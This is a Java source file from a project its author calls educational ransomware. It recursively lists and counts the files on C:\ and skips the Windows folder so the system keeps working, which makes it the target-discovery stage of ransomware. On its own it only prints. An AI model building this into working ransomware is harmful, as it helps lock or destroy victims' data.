/********************************************************************
    _____                        __        __
   |_   _|                      |  |      | |
     | |   ___ _ __   __ ____ _ |  |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' ||  | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\  V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/   \__/ \____,_|_|   \____|

Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 1.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;

import java.io.File;
import java.text.SimpleDateFormat;

public class FindFiles {
    static int count = 0;

    public void traverse(String path) {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                if (f.getName().equals("Windows")) return; //want system to still work

                traverse(f.getAbsolutePath());
                System.out.println("Dir:" + f.getAbsoluteFile());
            } else {
                SimpleDateFormat lastModified = new SimpleDateFormat("dd/MM/yyyy");
                System.out.println("File:" + f.getAbsoluteFile() + " Last Modified:" + f.lastModified());
                count++;
            }
        }

    }

    public static void main(String[] args) {
        FindFiles ff = new FindFiles();
        ff.traverse("c:\\");
        System.out.println(count);
    }
}
